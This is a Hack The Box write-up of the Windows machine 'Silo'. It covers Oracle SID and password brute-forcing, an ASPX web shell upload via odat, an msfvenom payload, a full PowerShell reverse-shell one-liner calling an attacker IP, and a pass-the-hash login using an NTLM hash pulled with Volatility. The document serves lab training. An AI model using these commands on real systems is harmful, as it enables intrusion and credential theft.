---
title: "[MEDIUM] HTB- Silo"
draft: false
tags:
  - htb
  - windows
  - oracle
  - tns
  - port-1521
  - odat
  - sqlplus
  - msfvenom
  - dmp
  - volatility
  - hashdump
---
## Information Gathering
### Rustscan

Rustscan finds several ports open but what stands out is port **1521** running **oracle**:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/silo]
└─$ rustscan --addresses 10.10.10.82 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com
<snip>
Host is up, received syn-ack (0.88s latency).
Scanned at 2024-04-10 11:12:28 EDT for 5s

PORT      STATE    SERVICE      REASON
80/tcp    open     http         syn-ack
135/tcp   filtered msrpc        no-response
139/tcp   filtered netbios-ssn  no-response
445/tcp   open     microsoft-ds syn-ack
1521/tcp  open     oracle       syn-ack
5985/tcp  filtered wsman        no-response
47001/tcp filtered winrm        no-response
49152/tcp open     unknown      syn-ack
49153/tcp open     unknown      syn-ack
49155/tcp filtered unknown      no-response
49161/tcp open     unknown      syn-ack
49162/tcp filtered unknown      no-response

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.25 seconds
```

### Nmap

Oracle version is **11.2.0.2.0** according to Nmap:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/silo]
└─$ sudo nmap -sVC -p 80,135,139,445,1521,5985,47001,49152,49153,49155,49161,49162 10.10.10.82 -v
<snip>
Nmap scan report for 10.10.10.82 (10.10.10.82)
Host is up (0.88s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Supported Methods: OPTIONS
135/tcp   open  msrpc?
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  unknown
49155/tcp open  tcpwrapped
49161/tcp open  unknown
49162/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
|_clock-skew: mean: -3m44s, deviation: 0s, median: -3m44s
| smb2-time: 
|   date: 2024-04-10T15:22:45
|_  start_date: 2024-04-10T08:07:20

<snip>
Nmap done: 1 IP address (1 host up) scanned in 269.70 seconds
           Raw packets sent: 22 (944B) | Rcvd: 21 (920B)
```
## Enumeration
### SMB - TCP 445

SMB null login is not allowed here:

![](https://i.imgur.com/IegnE0a.png)


Crackmapexec finds the device name **silo**:

![](https://i.imgur.com/9RAub6p.png)



### HTTP - TCP 80
**IIS 8.5** is running on the website:

![](https://i.imgur.com/nv1eKCx.png)


#### Directory Bruteforce

Feroxbuster finds nothing useful from directory bruteforcing:

`sudo feroxbuster -u http://10.10.10.82 -n -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -C 404`

![](https://i.imgur.com/7BMnoMo.png)


### HTTP - TCP 8080

There is HTTP running on port 8080 as well and it requires credentials. 

![](https://i.imgur.com/KMyZNnX.png)


Feroxbuster also finds nothing useful here:

`sudo feroxbuster -u http://10.10.10.802:8080/ -n -x php,aspx,asp,conf -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -C 404`



### Oracle TNS Listener - TCP 1521

I followed the following guides pentesting port 1521.

- [Source 1](https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573)
- [Source 2](https://secybr.com/posts/oracle-pentesting-best-practices/)

#### SID Enumeration

**tnscmd10g** seems to be requiring credentials for sign-in

`tnscmd10g status-p 1521 -h 10.10.10.82`

![](https://i.imgur.com/h1UQ9N7.png)



#### SID Bruteforce

Let's first bruteforce SID(Like a DB name) using hydra:

`hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521  10.10.10.82 oracle-sid`


![](https://i.imgur.com/ha0Wxro.png)


Hydra finds several SID names and we just need one of them to bruteforce user credentials.


#### Targeting Accounts

I will user metasploit's **oracle_default_userpass.txt** to perform user credentials bruteforce on SID **XE**:

`odat passwordguesser -s 10.10.10.82 -d XE --accounts-file /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt`

![](https://i.imgur.com/N7FyENH.png)



However, it seems like credentials are not passed properly。

I will use **awk** to have usernames and passwords in separate files:

`awk '{print $1 > "oracle_users.txt"; print $2 > "oracle_pass.txt"}' oracle_default_userpass.txt`

Now using separate user-list and password list, I can obtain valid credentials: (**scott/tiger**)


`sudo odat passwordguesser -s 10.10.10.82 -d XE --accounts-files /usr/share/metasploit-framework/data/wordlists/oracle_users.txt /usr/share/metasploit-framework/data/wordlists/oracle_pass.txt`

![](https://i.imgur.com/bEdIv2e.png)


## Shell as iis apppool

Now using **sqlplus**, I can access Oracle Database:

`sqlplus scott/tiger@10.10.10.82/XE`

![](https://i.imgur.com/pcqaA5j.png)


Using the following command, I can query usernames on DB:

`SELECT username FROM all_users WHERE username NOT IN ('SYS', 'SYSTEM');`

![](https://i.imgur.com/56St9JP.png)


Abusing Java for RCE fails since Java is not installed on the system:

`odat java -s 10.10.10.82 -U scott -P tiger -d XE --exec whoami`

![](https://i.imgur.com/7Eusvbe.png)


I will create reverse shell payload using **msfvenom**, planning to upload this to Oracle DB and execute it:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=1337 -f exe > rev.exe`

![](https://i.imgur.com/Y4HHoZJ.png)


However, it seems that user scott for insufficient privilege for this:

`odat utlfile -s 10.10.10.82 -U scott -P tiger -d XE --putFile /temp rev.exe ./rev.exe`

![](https://i.imgur.com/PzG7kgY.png)


From some enumeration, I figured out using **--sysdba** flag will allow me to upload **cmdasp.aspx** file to the DB:


`odat utlfile -s 10.10.10.82 -U scott -P tiger -d XE --putFile C:\\inetpub\\wwwroot shell.aspx /usr/share/webshells/aspx/cmdasp.aspx --sysdba`

![](https://i.imgur.com/n4XdiEh.png)


Now I can execute commands through the web browser:

![](https://i.imgur.com/z837oto.png)


Using the powershell script below, I can spawn a reerse shell:

`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.21',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

![](https://i.imgur.com/fpcEW3b.png)


Now I have a reverse shell as the low privilege user.

## Privesc to Administrator

There is **Oracle issue.txt** at user **Phineas**'s Desktop and it reveals link to the dropbox and password for it: **?%Hm8646uC$**

![](https://i.imgur.com/cgjtCpy.png)


Going to Dropbox download link, I see a form for a link password. Weirdly, password from **Oracle issue.txt** above won't work.


![](https://i.imgur.com/5gnpQNW.png)


From some enumeration, I realized this because spawned shell cannot read special character such as **£** and through my webshell earlier, It reveals the actual password:

![](https://i.imgur.com/buBqsrd.png)


Using **£%Hm8646uC$**, I can access zip file inside the dropbox share:


![](https://i.imgur.com/jT4gbIz.png)


Unzipping the file provides me a **dmp** file:

![](https://i.imgur.com/p810xfV.png)

Using the command below, I can query information related to the dump file:

`sudo python3 vol.py -f ~/Documents/htb/silo/SILO-20180105-221806.dmp windows.info.Info`

![](https://i.imgur.com/yLkFSit.png)



> The Windows operating system maintains its configuration settings, user preferences, and other system-related information in a database called the registry. The registry is organized into hierarchical structures called "hives," each of which contains keys and values representing various aspects of the system's configuration.

When you run **hivelist** in Volatility, it parses the memory dump and provides information about the virtual addresses where each registry hive is loaded into memory. This information is crucial for further analysis because it allows forensic investigators and analysts to access and examine the contents of the registry, such as user profiles, installed software, network settings, and more.

I can list the hivelist with the following command:

`sudo python3 vol.py -f ~/Documents/htb/silo/SILO-20180105-221806.dmp hivelist`

![](https://i.imgur.com/WX8UztP.png)

Using the command below, I can drop password hash for **Administrator**:

`sudo python3 vol.py -f ~/Documents/htb/silo/SILO-20180105-221806.dmp hashdump`

![](https://i.imgur.com/qHSAoGO.png)

Now passing the hash to evil-winrm , I have a shell as Administrator

`evil-winrm -i 10.10.10.82 -u Administrator -H 9e730375b7cbcebf74ae46481e07b0c7`

![](https://i.imgur.com/3CQ3l7w.png)



## References
- https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener
- https://secybr.com/posts/oracle-pentesting-best-practices/
- https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573
- https://technicalnavigator.in/how-to-extract-information-from-dmp-files/
